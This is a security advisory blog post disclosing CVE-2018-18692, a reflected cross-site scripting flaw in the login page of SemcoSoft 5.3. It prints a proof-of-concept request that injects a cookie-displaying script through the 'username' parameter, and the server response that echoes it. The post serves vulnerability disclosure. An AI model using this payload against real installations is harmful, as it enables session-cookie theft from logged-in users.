---
layout: post
title: "CVE-2018-18692: Cross-Site Scripting in Semcosoft"
date:   2019-02-14 21:40:00
image:
      url: /assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg
video: false
comments: true
theme_color: 302F2D

author: 'Patrick Münch'

author_image: "https://avatars0.githubusercontent.com/u/7220740?s=400"
author_link: "https://twitter.com/atomiczero111"
---

# Overview

- Vendor: SEMCO Software Engineering GmbH
- Product: SemcoSoft
- Version: 5.3
- Vulnerability: Reflected Cross-Site Scripting


# Background

SEMCO stands for a modern seminar and course management, which supports employees in a time-saving and efficient way in the daily business. It finds its use in company training, coaching, seminars of any orientation and in the area of internal training.

Vendor's website ([SEMCO](https://www.semcosoft.com)):

# Issue Description

As part of a penetration test, a cross-site scripting (XSS) vulnerability was found in the Semco software, which allows an attacker to steal the session cookie of an already logged-in user through a cross-site request-forgery (CSRF) attack.

Reflected cross-site scripting (XSS) occurs when an attacker injects executable code into the browser within a single HTTP response. The injected code is not stored inside the application. It affects users who open a malicious link or a third party website. The injected code is part of a URI or HTTP parameter that was not properly validated by the application and returned to the victim. Such an attack allows an attacker to access information such as session cookies from the user. In the case of the Semco software, this is possible because the parameter "username" of the HTTP GET request is not subjected to any input validation.

By calling the URL, the XSS vulnerability can be exploited and the PHPSESSID, which is stored in a cookie, can be displayed.

__HTTP-Request__

~~~ html
GET /login?username=%22%3E%3C/span%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cspan%20id=%22username&_e=RvkztFgiQsQI%252FKXLsr48kh%252BgKeVU1jNeaLJ0NZLxQQpE6KO1No9MHbbxa%252Bygv1qv&password=&post=login&remove_duplicate_logins= HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: de,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
~~~

__HTTP-Response__

~~~ html
HTTP/1.1 200 OK
Date: Fri, 26 Oct 2018 14:21:48 GMT
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.6.36-1~dotdeb+7.1
Set-Cookie: PHPSESSID=tljhfircqdj32t7gj4q8vjk042; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 6635
Connection: close
Content-Type: text/html; charset=utf-8

...[SNIP]...

<div>
	<form name="loginform" id="loginform" method="post" action="/login?post=login" class="inhaltform" style="margin: 0 0 200px 0;">
    <input type="hidden" id="remove_duplicate_logins" name="remove_duplicate_logins" value="0">
		<fieldset>
			<h3>Login</h3>
			<div class="formzeile">
			<label>Benutzer</label>
			<span class="textfeld"><input name="username" type="text" id="username" value=""></span><script>alert(document.cookie)</script><span id="username"></span>
			</div>
			<div class="formzeile">
			<label>Passwort</label>
			<span class="textfeld"><input name="password" type="password" id="password" value=""></span>
			</div>
		</fieldset>

...[SNIP]...
~~~

# CVE

[CVE-2018-18692](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18692)

# CVSSv3 Base Score

CVSS Base Score: __5.5__

CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N

# Credit

Pascal Keul of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

Patrick Muench of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2018 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
